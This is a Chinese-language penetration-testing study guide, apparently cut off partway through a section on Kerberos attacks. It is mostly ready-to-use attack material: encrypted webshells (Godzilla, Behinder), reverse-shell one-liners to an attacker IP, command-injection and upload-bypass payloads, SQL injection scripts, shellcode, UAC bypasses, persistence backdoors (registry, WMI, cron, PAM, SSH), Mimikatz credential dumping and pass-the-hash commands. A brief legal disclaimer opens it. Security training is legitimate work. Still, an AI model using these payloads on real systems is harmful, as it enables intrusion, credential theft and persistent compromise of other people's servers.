# 服务器渗透完整学习指南

## 📋 学习路线图

```
信息收集(2周) → 网络渗透(2周) → 系统渗透(3周) → 漏洞利用(4周) → 后渗透(2周) → 社会工程学(1周) → 防御规避(2周) → 实战演练(持续)
```

## ⚖️ 法律声明与道德准则

> **严正警告**: 未经授权的服务器渗透是严重的网络犯罪行为！

### 合法使用场景
- ✅ 获得书面授权的渗透测试项目
- ✅ 企业委托的安全评估（签署保密协议）
- ✅ 漏洞赏金计划（符合规则）
- ✅ 个人搭建的实验室环境
- ✅ 合法的CTF竞赛和安全演练

### 严格禁止
- ❌ 未经授权访问任何服务器
- ❌ 窃取、删除、篡改他人数据
- ❌ 破坏服务器正常运行
- ❌ 利用漏洞进行勒索、敲诈
- ❌ 传播恶意软件和木马

### 渗透测试授权书必备内容
```
1. 明确的测试范围（IP地址、域名、系统）
2. 测试时间窗口
3. 允许的测试方法和禁止操作
4. 数据保护和保密条款
5. 紧急联系人和终止机制
6. 双方法人签字盖章
```

---

## 1. 信息收集

### 1.1 被动信息收集

#### DNS信息收集

**DNS记录查询**:
```bash
# A记录查询
dig target.com A
nslookup target.com

# MX记录（邮件服务器）
dig target.com MX

# NS记录（域名服务器）
dig target.com NS

# TXT记录（SPF、DKIM等）
dig target.com TXT

# 完整DNS信息
dig target.com ANY

# 反向DNS查询
dig -x 192.168.1.1
```

**DNS区域传送漏洞测试**:
```bash
# 尝试区域传送
dig @ns1.target.com target.com AXFR

# 使用dnsrecon
dnsrecon -d target.com -t axfr

# 使用fierce
fierce -dns target.com
```

**子域名枚举**:
```bash
# Sublist3r
sublist3r -d target.com -o subdomains.txt

# Amass（强大）
amass enum -d target.com -o amass_results.txt
amass enum -passive -d target.com

# Subfinder
subfinder -d target.com -o subfinder_results.txt

# 证书透明度日志
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u

# DNS字典爆破
dnsrecon -d target.com -D wordlist.txt -t brt
```

#### WHOIS查询

```bash
# 基础WHOIS查询
whois target.com

# 查询AS号
whois -h whois.radb.net AS64512

# IP WHOIS查询
whois 8.8.8.8

# 批量WHOIS
for domain in $(cat domains.txt); do whois $domain; done
```

**WHOIS信息提取**:
- 注册商和注册人信息
- 联系邮箱和电话
- DNS服务器
- 注册日期和过期日期
- IP地址段

#### 搜索引擎利用（Google Dorking）

**高级搜索语法**:
```
# 敏感文件
site:target.com ext:sql | ext:db | ext:bak
site:target.com ext:log | ext:txt | ext:conf

# 配置文件
site:target.com inurl:".env" | inurl:"config.php"
site:target.com filetype:xml inurl:"web.config"

# 备份文件
site:target.com inurl:"backup" | inurl:"old" | inurl:"~"

# 管理后台
site:target.com inurl:admin | inurl:login | inurl:dashboard

# 数据库错误
site:target.com "mysql_fetch" | "SQL syntax" | "ORA-"

# API密钥
site:target.com "api_key" | "apikey" | "api-key"

# 云存储桶
site:s3.amazonaws.com "target"
site:storage.googleapis.com "target"

# GitHub泄露
site:github.com "target.com" password | api_key
site:github.com "target.com" filename:.env
```

#### OSINT开源情报

**社交媒体情报**:
```bash
# LinkedIn员工信息
- 职位和部门
- 技术栈
- 组织架构
- 联系方式

# Twitter/X
- 技术讨论
- 系统故障信息
- 员工动态

# GitHub
theHarvester -d target.com -b github
```

**公开数据库查询**:
```bash
# Shodan（互联网设备搜索引擎）
shodan search "hostname:target.com"
shodan search "org:'Target Company'"
shodan search "ssl:target.com"

# Censys（SSL证书搜索）
censys search "target.com"

# SecurityTrails（历史DNS）
# 查询历史DNS记录
# 查询子域名历史
# 查询IP历史

# Archive.org（历史快照）
https://web.archive.org/web/*/target.com
```

**数据泄露查询**:
```bash
# Have I Been Pwned
# 查询邮箱是否泄露

# DeHashed
# 查询泄露的凭证

# Breach Forums
# 查询最新数据泄露
```

### 1.2 主动信息收集

#### 端口扫描

**Nmap扫描策略**:
```bash
# 快速扫描常用端口
nmap -F target.com

# 全端口扫描
nmap -p- target.com

# 指定端口
nmap -p 80,443,22,21,3306 target.com

# TCP SYN扫描（隐蔽）
sudo nmap -sS target.com

# TCP Connect扫描
nmap -sT target.com

# UDP扫描
sudo nmap -sU -p 53,161,162,500 target.com

# 服务版本检测
nmap -sV target.com

# 操作系统检测
sudo nmap -O target.com

# 综合扫描（A = -sV -sC -O）
sudo nmap -A target.com

# 脚本扫描
nmap --script=vuln target.com
nmap --script=default target.com

# 规避防火墙
nmap -f target.com                    # 分片
nmap -D RND:10 target.com            # 诱饵
nmap --source-port 53 target.com     # 源端口
nmap -sN target.com                  # NULL扫描

# 时序控制
nmap -T0 target.com  # 极慢（IDS规避）
nmap -T4 target.com  # 快速
nmap -T5 target.com  # 疯狂模式
```

**Masscan高速扫描**:
```bash
# 全端口快速扫描
masscan -p1-65535 target.com --rate=10000

# 扫描整个网段
masscan 10.0.0.0/8 -p80,443 --rate=100000

# 排除特定IP
masscan 192.168.1.0/24 -p80 --rate=1000 --exclude 192.168.1.1

# 保存结果
masscan -p80,443 target.com --rate=1000 -oX scan_results.xml
```

**RustScan（Rust端口扫描器）**:
```bash
# 快速扫描
rustscan -a target.com

# 指定端口
rustscan -a target.com -p 80,443,22

# 批量扫描
rustscan -a 192.168.1.0/24
```

#### 服务识别与指纹识别

**Banner抓取**:
```bash
# Netcat抓取
nc target.com 80
HEAD / HTTP/1.0

# Telnet抓取
telnet target.com 25
EHLO test

# Nmap服务识别
nmap -sV --version-intensity 9 target.com

# Amap应用识别
amap -bq target.com 1-65535
```

**Web服务器指纹**:
```bash
# WhatWeb
whatweb target.com

# Wappalyzer（浏览器插件）
# 识别CMS、框架、服务器

# httprint
httprint -h target.com -s signatures.txt

# 手工识别
curl -I https://target.com
# 查看Server头、X-Powered-By等
```

**操作系统指纹识别**:
```bash
# Nmap OS检测
sudo nmap -O target.com

# P0f被动识别
sudo p0f -i eth0

# 基于TTL判断
# TTL=64  -> Linux/Unix
# TTL=128 -> Windows
# TTL=255 -> 网络设备

# Xprobe2主动探测
xprobe2 target.com
```

#### 漏洞扫描

**Nessus（商业）**:
```
1. 配置扫描策略
2. 添加目标主机
3. 执行扫描
4. 分析漏洞报告
5. 验证高危漏洞
```

**OpenVAS（开源）**:
```bash
# 启动OpenVAS
openvas-start

# 访问Web界面
https://localhost:9392

# 创建扫描任务
# 查看漏洞报告
```

**Nikto（Web扫描）**:
```bash
# 基础扫描
nikto -h https://target.com

# 指定端口
nikto -h target.com -p 80,443,8080

# 使用代理
nikto -h target.com -useproxy http://proxy:8080

# 保存结果
nikto -h target.com -o report.html -Format html
```

**Nuclei（模板化扫描）**:
```bash
# 安装模板
nuclei -update-templates

# 扫描单个目标
nuclei -u https://target.com

# 批量扫描
nuclei -l targets.txt

# 指定严重程度
nuclei -u target.com -severity critical,high

# 使用特定模板
nuclei -u target.com -t cves/ -t exposures/
```

---

## 2. 网络渗透

### 2.1 网络协议攻击

#### ARP欺骗（中间人攻击）

**攻击原理**:
```
正常通信:
Client <-> Gateway <-> Internet

ARP欺骗:
Client <-> Attacker <-> Gateway <-> Internet
      (伪装成网关)
```

**实施攻击**:
```bash
# 开启IP转发
echo 1 > /proc/sys/net/ipv4/ip_forward

# arpspoof（ettercap）
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1  # 欺骗客户端
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100  # 欺骗网关

# Ettercap图形化
ettercap -G

# Bettercap（现代化工具）
bettercap -iface eth0
> net.probe on
> set arp.spoof.targets 192.168.1.100
> arp.spoof on
> net.sniff on
```

**流量嗅探**:
```bash
# Wireshark抓包
wireshark

# tcpdump命令行
tcpdump -i eth0 -w capture.pcap
tcpdump -i eth0 port 80 -A  # HTTP流量

# dsniff工具集
dsniff -i eth0              # 抓取密码
urlsnarf -i eth0           # URL记录
webspy -i eth0             # Web浏览记录
```

#### DNS攻击

**DNS欺骗**:
```bash
# dnsspoof（ettercap）
dnsspoof -i eth0 -f dns_hosts.txt

# dns_hosts.txt内容
192.168.1.100 target.com
192.168.1.100 www.target.com

# Bettercap DNS欺骗
> set dns.spoof.domains target.com,*.target.com
> set dns.spoof.address 192.168.1.100
> dns.spoof on
```

**DNS隧道**:
```bash
# iodine（DNS隧道工具）
# 服务端
iodined -f -c -P password 10.0.0.1 tunnel.yourdomain.com

# 客户端
iodine -f -P password tunnel.yourdomain.com

# dnscat2
# 服务端
dnscat2-server yourdomain.com

# 客户端
./dnscat yourdomain.com
```

#### DHCP攻击

**DHCP饥饿攻击**:
```bash
# Yersinia DHCP攻击
yersinia -G  # 图形界面

# 命令行模式
yersinia -I
> dhcp
> send request
```

**恶意DHCP服务器**:
```bash
# 配置恶意DHCP服务器
# 分配错误的网关和DNS
# 实施中间人攻击
```

### 2.2 无线网络渗透

#### WiFi破解

**WEP破解**:
```bash
# 开启监听模式
airmon-ng start wlan0

# 扫描网络
airodump-ng wlan0mon

# 抓包
airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w capture wlan0mon

# 注入数据包（加速）
aireplay-ng -3 -b XX:XX:XX:XX:XX:XX -h YY:YY:YY:YY:YY:YY wlan0mon

# 破解密钥
aircrack-ng -b XX:XX:XX:XX:XX:XX capture-01.cap
```

**WPA/WPA2破解**:
```bash
# 抓取握手包
airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w handshake wlan0mon

# 发送解除认证包（强制客户端重连）
aireplay-ng -0 10 -a XX:XX:XX:XX:XX:XX -c CLIENT_MAC wlan0mon

# 字典攻击
aircrack-ng -w wordlist.txt -b XX:XX:XX:XX:XX:XX handshake-01.cap

# Hashcat GPU破解
hashcat -m 2500 handshake.hccapx wordlist.txt

# Wifite自动化
wifite --wpa
```

**WPS PIN破解**:
```bash
# Reaver攻击
reaver -i wlan0mon -b XX:XX:XX:XX:XX:XX -vv

# Bully攻击
bully wlan0mon -b XX:XX:XX:XX:XX:XX -v 3

# Pixie Dust攻击
reaver -i wlan0mon -b XX:XX:XX:XX:XX:XX -vv -K 1
```

#### Evil Twin（邪恶双胞胎）

```bash
# 创建假AP
hostapd hostapd.conf

# hostapd.conf配置
interface=wlan0
driver=nl80211
ssid=FreeWiFi
hw_mode=g
channel=6
auth_algs=1
wpa=2
wpa_passphrase=12345678
wpa_key_mgmt=WPA-PSK

# DHCP服务
dnsmasq -C dnsmasq.conf

# 流量转发和嗅探
```

---

## 3. 系统渗透

### 3.1 Windows系统渗透

#### SMB协议攻击

**EternalBlue (MS17-010)**:
```bash
# 漏洞检测
nmap -p 445 --script smb-vuln-ms17-010 target.com

# Metasploit利用
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target.com
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST attacker_ip
exploit
```

**SMB中继攻击**:
```bash
# Responder捕获认证
responder -I eth0 -rdwv

# ntlmrelayx中继
ntlmrelayx.py -tf targets.txt -smb2support

# 结合社会工程学
# 诱导目标访问攻击者的SMB共享
```

**SMB弱密码爆破**:
```bash
# CrackMapExec
crackmapexec smb target.com -u users.txt -p passwords.txt

# Hydra
hydra -L users.txt -P passwords.txt smb://target.com

# Metasploit
use auxiliary/scanner/smb/smb_login
set RHOSTS target.com
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

#### RDP攻击

**BlueKeep (CVE-2019-0708)**:
```bash
# 漏洞扫描
nmap -p 3389 --script rdp-vuln-ms12-020 target.com

# Metasploit检测
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS target.com
run

# 利用（谨慎！可能导致蓝屏）
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS target.com
set target 2  # Windows 7 x64
exploit
```

**RDP暴力破解**:
```bash
# Crowbar
crowbar -b rdp -s target.com/32 -u admin -C passwords.txt

# Hydra
hydra -l administrator -P passwords.txt rdp://target.com

# Ncrack
ncrack -u administrator -P passwords.txt rdp://target.com:3389
```

**RDP劫持**:
```powershell
# 查看RDP会话
query user

# 劫持会话（需要SYSTEM权限）
tscon 1 /dest:rdp-tcp#2
```

#### Windows权限提升

**服务权限滥用**:
```powershell
# PowerUp枚举
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# 查找Unquoted服务路径
gwmi -class Win32_Service | Where {$_.PathName -like '* *' -and $_.PathName -notlike '*"*'}

# 查找可写服务二进制
Get-ModifiableServiceFile

# 利用
sc config vulnerable_service binpath= "C:\backdoor.exe"
sc stop vulnerable_service
sc start vulnerable_service
```

**UAC绕过**:
```powershell
# eventvwr.exe方法
New-Item "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "(default)" -Value "cmd.exe /c powershell.exe -ep bypass" -Force
Start-Process "eventvwr.exe"

# fodhelper.exe方法（Win10）
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd.exe" -Force
Start-Process "fodhelper.exe"
```

**Token窃取**:
```powershell
# Incognito（Meterpreter）
load incognito
list_tokens -u
impersonate_token "NT AUTHORITY\\SYSTEM"

# PowerShell Token Manipulation
Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
```

### 3.2 Linux系统渗透

#### SSH攻击

**SSH弱密码爆破**:
```bash
# Hydra
hydra -l root -P passwords.txt ssh://target.com

# Medusa
medusa -h target.com -u root -P passwords.txt -M ssh

# Patator
patator ssh_login host=target.com user=root password=FILE0 0=passwords.txt -x ignore:mesg='Authentication failed'
```

**SSH密钥认证攻击**:
```bash
# 查找私钥
find / -name id_rsa 2>/dev/null
find / -name id_dsa 2>/dev/null

# 使用泄露的私钥
chmod 600 id_rsa
ssh -i id_rsa user@target.com

# 破解加密的私钥
ssh2john id_rsa > hash.txt
john --wordlist=passwords.txt hash.txt
```

**SSH隧道**:
```bash
# 本地端口转发
ssh -L 8080:localhost:80 user@target.com

# 远程端口转发
ssh -R 4444:localhost:22 user@attacker.com

# 动态端口转发（SOCKS代理）
ssh -D 1080 user@target.com
proxychains nmap target_internal_ip
```

#### Linux权限提升

**SUID提权**:
```bash
# 查找SUID文件
find / -perm -4000 -type f 2>/dev/null

# 常见可利用SUID
# vim、nmap、find、python、perl等

# vim提权
vim -c ':!/bin/bash'

# nmap提权（旧版本）
nmap --interactive
!sh

# find提权
find /home -exec /bin/bash -p \;

# python提权
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**内核漏洞提权**:
```bash
# 查看内核版本
uname -a
cat /etc/issue

# 使用linux-exploit-suggester
./linux-exploit-suggester.sh

# Dirty COW (CVE-2016-5195)
gcc -pthread dirty.c -o dirty -lcrypt
./dirty password

# 编译提权exploit
gcc exploit.c -o exploit
./exploit
```

**Sudo滥用**:
```bash
# 查看sudo权限
sudo -l

# 常见可利用sudo命令
# vim、less、more、awk、find、nmap等

# vim sudo提权
sudo vim -c ':!/bin/bash'

# less sudo提权
sudo less /etc/passwd
!/bin/bash

# awk sudo提权
sudo awk 'BEGIN {system("/bin/bash")}'
```

**定时任务劫持**:
```bash
# 查看cron任务
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# 查找可写的cron脚本
find /etc/cron* -type f -perm -o+w

# 劫持可写脚本
echo '#!/bin/bash' > /path/to/script.sh
echo 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1' >> /path/to/script.sh
```

---

## 4. 漏洞利用

### 4.1 缓冲区溢出

#### 栈溢出基础

**漏洞代码示例**:
```c
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // 危险！没有边界检查
    printf("Buffer: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return 1;
    }
    vulnerable_function(argv[1]);
    return 0;
}
```

**漏洞利用过程**:
```python
import struct

# 1. 确定偏移量
# 使用pattern_create创建唯一字符串
# pattern_create.rb -l 200
# 运行程序并找到覆盖EIP的模式
# pattern_offset.rb -q 0x41424344

# 2. 查找返回地址
# 找到没有ASLR和DEP的内存地址
# 或者使用ROP链

# 3. 构造payload
offset = 76
ret_addr = struct.pack("<I", 0xdeadbeef)  # 返回地址
nop_sled = b"\x90" * 16
shellcode = b"\x31\xc0\x50\x68..."  # shellcode

payload = b"A" * offset + ret_addr + nop_sled + shellcode

# 4. 执行exploit
# ./vulnerable_program $(python exploit.py)
```

**Shellcode编写**:
```asm
; Linux x86 execve("/bin/sh") shellcode
; 28 bytes

global _start

section .text
_start:
    xor eax, eax
    push eax
    push 0x68732f2f  ; "//sh"
    push 0x6e69622f  ; "/bin"
    mov ebx, esp
    push eax
    mov edx, esp
    push ebx
    mov ecx, esp
    mov al, 11       ; execve syscall
    int 0x80

; 编译: nasm -f elf32 shellcode.asm
; 链接: ld -m elf_i386 -o shellcode shellcode.o
; 提取: objdump -d shellcode | grep -oP '(?<=\t)([0-9a-f]{2} )+' | tr -d ' \n'
```

**使用msfvenom生成shellcode**:
```bash
# Linux x86反向shell
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f c

# Windows x64反向shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f c

# 无坏字符
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -b '\x00\x0a\x0d' -f c

# 编码
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f c
```

#### ROP（Return-Oriented Programming）

**ROP链构造**:
```python
from pwn import *

# 查找gadgets
# ROPgadget --binary ./binary | grep "pop rdi"

# 构造ROP链
rop = ROP('./binary')
rop.call('system', ['/bin/sh'])
payload = fit({offset: rop.chain()})

# 或手工构造
pop_rdi = p64(0x400123)  # pop rdi; ret
bin_sh = p64(0x600456)   # "/bin/sh" 字符串地址
system = p64(0x400789)   # system函数地址

payload = b"A" * offset
payload += pop_rdi
payload += bin_sh
payload += system
```

### 4.2 Web漏洞利用

#### SQL注入深入

**联合查询注入（UNION）**:
```sql
-- 确定列数
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--  # 报错，说明列数为2

-- 确定显示位
' UNION SELECT 1,2--

-- 提取数据
' UNION SELECT database(),user()--
' UNION SELECT group_concat(table_name),2 FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT group_concat(column_name),2 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password FROM users--
```

**布尔盲注自动化**:
```python
import requests

url = "http://target.com/page?id=1"
database_name = ""

# 猜测数据库名长度
for length in range(1, 20):
    payload = f"' AND LENGTH(database())={length}--"
    response = requests.get(url + payload)
    if "Welcome" in response.text:
        print(f"[+] Database name length: {length}")
        break

# 猜测数据库名
for position in range(1, length + 1):
    for char in range(32, 127):
        payload = f"' AND ASCII(SUBSTRING(database(),{position},1))={char}--"
        response = requests.get(url + payload)
        if "Welcome" in response.text:
            database_name += chr(char)
            print(f"[+] Database: {database_name}")
            break

print(f"[+] Final database name: {database_name}")
```

**时间盲注**:
```python
import requests
import time

url = "http://target.com/page?id=1"

def time_based_sqli(payload):
    start = time.time()
    requests.get(url + payload)
    elapsed = time.time() - start
    return elapsed >= 5

# 猜测数据
database = ""
for i in range(1, 20):
    for char in range(32, 127):
        payload = f"' AND IF(ASCII(SUBSTRING(database(),{i},1))={char},SLEEP(5),0)--"
        if time_based_sqli(payload):
            database += chr(char)
            print(f"[+] Database: {database}")
            break
```

**SQLMap自动化**:
```bash
# 基础注入检测
sqlmap -u "http://target.com/page?id=1" --batch

# POST注入
sqlmap -u "http://target.com/login" --data="username=admin&password=pass" -p username

# Cookie注入
sqlmap -u "http://target.com/page" --cookie="PHPSESSID=xxx" --level=2

# 获取数据
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D database_name --tables
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump

# OS shell
sqlmap -u "http://target.com/page?id=1" --os-shell

# WAF绕过
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between --random-agent
```

#### 文件上传漏洞

**绕过技巧**:
```bash
# 1. 双扩展名
shell.php.jpg
shell.php.png

# 2. 空字节注入（PHP < 5.3.4）
shell.php%00.jpg

# 3. .htaccess上传
AddType application/x-httpd-php .jpg
# 然后上传shell.jpg

# 4. 大小写绕过
shell.PhP
shell.pHp

# 5. 添加特殊字符
shell.php.
shell.php::$DATA (Windows)
shell.php%20

# 6. MIME类型伪造
Content-Type: image/jpeg
# 但文件内容是PHP

# 7. 文件头伪造
GIF89a
<?php system($_GET['cmd']); ?>
```

**Webshell上传**:
```php
# 一句话木马
<?php @eval($_POST['cmd']); ?>

# 哥斯拉（Godzilla）
<?php @session_start(); @set_time_limit(0); @error_reporting(0); function encode($D,$K){ for($i=0;$i<strlen($D);$i++) { $c = $K[$i+1&15]; $D[$i] = $D[$i]^$c; } return $D; } $payloadName='payload'; $key='3c6e0b8a9c15224a'; $data=file_get_contents("php://input"); if ($data!==false){ $data=encode($data,$key); if (isset($_SESSION[$payloadName])){ $payload=encode($_SESSION[$payloadName],$key); eval($payload); echo encode(@run($data),$key); }else{ if (stripos($data,$payloadName)===false){ $_SESSION[$payloadName]=encode($data,$key); } } } ?>

# 冰蝎（Behinder）
<?php @error_reporting(0); session_start(); $key="e45e329feb5d925b"; $_SESSION['k']=$key; session_write_close(); $post=file_get_contents("php://input"); if(!extension_loaded('openssl')){ $t="base64_"."decode"; $post=$t($post.""); for($i=0;$i<strlen($post);$i++) { $post[$i] = $post[$i]^$key[$i+1&15]; } }else{ $post=openssl_decrypt($post, "AES128", $key); } $arr=explode('|',$post); $func=$arr[0]; $params=$arr[1]; class C{public function __invoke($p) {eval($p."");}} @call_user_func(new C(),$params); ?>
```

#### 命令注入

**注入点识别**:
```bash
# 常见注入点
ping 8.8.8.8
nslookup target.com
whois target.com
traceroute target.com
```

**注入payload**:
```bash
# 命令分隔符
127.0.0.1; whoami
127.0.0.1 && whoami
127.0.0.1 || whoami
127.0.0.1 | whoami
127.0.0.1 `whoami`
127.0.0.1 $(whoami)

# 换行符
127.0.0.1%0Awhoami
127.0.0.1%0Dwhoami

# 绕过空格
{cat,/etc/passwd}
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd

# 绕过黑名单
c''at /etc/passwd
c\at /etc/passwd
/bin/c?t /etc/passwd
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
```

**反弹Shell**:
```bash
# Bash反弹
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1

# NC反弹
nc -e /bin/bash 192.168.1.100 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.100 4444 >/tmp/f

# Python反弹
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.100",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PHP反弹
php -r '$sock=fsockopen("192.168.1.100",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

---

## 5. 后渗透技术

### 5.1 权限维持

#### Windows后门

**注册表启动项**:
```powershell
# Run键
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\System32\backdoor.exe" /f

# Winlogon
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\backdoor.exe" /f

# 屏幕保护程序
reg add "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "C:\backdoor.scr" /f
```

**计划任务**:
```powershell
# 创建每日任务
schtasks /create /tn "WindowsUpdate" /tr "C:\backdoor.exe" /sc daily /st 09:00 /ru SYSTEM

# 创建登录触发任务
schtasks /create /tn "OnLogon" /tr "powershell.exe -WindowStyle Hidden -File C:\backdoor.ps1" /sc onlogon /ru SYSTEM

# XML导入（更隐蔽）
schtasks /create /tn "GoogleUpdate" /xml task.xml
```

**WMI事件订阅**:
```powershell
# 创建事件过滤器
$Filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
    Name = "SystemBootFilter"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# 创建事件消费者
$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
    Name = "SystemBootConsumer"
    CommandLineTemplate = "powershell.exe -NoP -W Hidden -File C:\backdoor.ps1"
}

# 绑定
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
}
```

**DLL劫持**:
```c
// 恶意DLL模板
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        // 执行恶意代码
        WinExec("calc.exe", SW_HIDE);

        // 加载原始DLL
        LoadLibrary("C:\\Windows\\System32\\original.dll");
    }
    return TRUE;
}

// 导出原DLL的所有函数（使用def文件）
```

#### Linux后门

**SSH后门**:
```bash
# 添加SSH公钥
mkdir -p ~/.ssh
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# 修改SSH配置
echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config
systemctl restart sshd

# SSH软链接后门
ln -sf /usr/sbin/sshd /tmp/su
/tmp/su -oPort=12345
```

**Crontab后门**:
```bash
# 用户crontab
(crontab -l ; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'") | crontab -

# 系统crontab
echo "*/5 * * * * root /tmp/backdoor.sh" >> /etc/crontab

# @reboot任务
(crontab -l ; echo "@reboot /tmp/backdoor.sh") | crontab -
```

**PAM后门**:
```bash
# 安装PAM后门（记录所有SSH密码）
cd /tmp
wget https://github.com/user/pam_backdoor/backdoor.so
cp backdoor.so /lib/x86_64-linux-gnu/security/
echo "auth optional backdoor.so" >> /etc/pam.d/sshd

# 或者编译自定义PAM模块
```

**LD_PRELOAD后门**:
```bash
# 创建恶意共享库
# 劫持系统函数

# 添加到环境变量
echo "export LD_PRELOAD=/lib/backdoor.so" >> /etc/profile
```

### 5.2 数据收集

#### 敏感信息收集

**Windows**:
```powershell
# 搜索敏感文件
dir /s /b C:\ | findstr /i "password config credential"
dir /s /b C:\ | findstr /i ".txt .doc .xls .pdf"

# 浏览器密码提取
LaZagne.exe browsers

# WiFi密码
netsh wlan show profiles
netsh wlan show profile name="WiFi-Name" key=clear

# 最近文件
dir "%APPDATA%\Microsoft\Windows\Recent"

# 剪贴板内容
Get-Clipboard
```

**Linux**:
```bash
# 搜索敏感文件
find / -name "*password*" 2>/dev/null
find / -name "*.conf" 2>/dev/null
find / -name "id_rsa" 2>/dev/null

# 历史命令
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.mysql_history

# 环境变量
env | grep -i pass

# 配置文件
cat /etc/passwd
cat /etc/shadow
cat ~/.ssh/config
cat ~/.aws/credentials
```

#### 凭证转储

**Mimikatz**:
```powershell
# 提权
privilege::debug
token::elevate

# 提取密码
sekurlsa::logonpasswords

# 提取票据
sekurlsa::tickets /export

# 提取SAM
lsadump::sam

# 提取LSA Secrets
lsadump::secrets

# 提取域信息
lsadump::dcsync /domain:domain.com /user:administrator
```

**Procdump离线提取**:
```bash
# 1. 导出lsass进程
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# 2. 传输到攻击机
# 3. 使用Mimikatz离线解析
mimikatz.exe
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

**hashcat破解**:
```bash
# NTLM哈希
hashcat -m 1000 hash.txt wordlist.txt

# 规则攻击
hashcat -m 1000 hash.txt wordlist.txt -r best64.rule

# 掩码攻击
hashcat -m 1000 hash.txt -a 3 ?u?l?l?l?l?d?d?d?s

# Kerberos TGS票据
hashcat -m 13100 tgs.hash wordlist.txt
```

### 5.3 横向移动

#### Pass-the-Hash

**Impacket工具集**:
```bash
# PsExec
psexec.py -hashes :ntlmhash administrator@192.168.1.10

# WMIExec
wmiexec.py -hashes :ntlmhash administrator@192.168.1.10

# SMBExec
smbexec.py -hashes :ntlmhash administrator@192.168.1.10

# SecretsDump
secretsdump.py -hashes :ntlmhash administrator@192.168.1.10
```

**CrackMapExec**:
```bash
# 单一目标
crackmapexec smb 192.168.1.10 -u administrator -H ntlmhash

# 批量测试
crackmapexec smb 192.168.1.0/24 -u administrator -H ntlmhash

# 执行命令
crackmapexec smb 192.168.1.10 -u administrator -H ntlmhash -x "whoami"

# 提取SAM
crackmapexec smb 192.168.1.10 -u administrator -H ntlmhash --sam
```

#### Kerberos攻击

**Golden Ticket（黄金票据）**:
```powershell
# 1. 获取krbtgt哈希
mimikatz "lsadump::dcsync /domain:domain.com /user:krbtgt"

# 2. 生成Golden Ticket
mimikatz "kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:hash /ptt"

# 3. 访问任意资源
dir \\dc\c$
```

**Silver Ticket（白银票据）**:
```powershell
# 生成特定服务的票据
mimikatz "kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-xxx /target:server.domain.com /service:cifs /rc4:machine_account_hash /ptt"

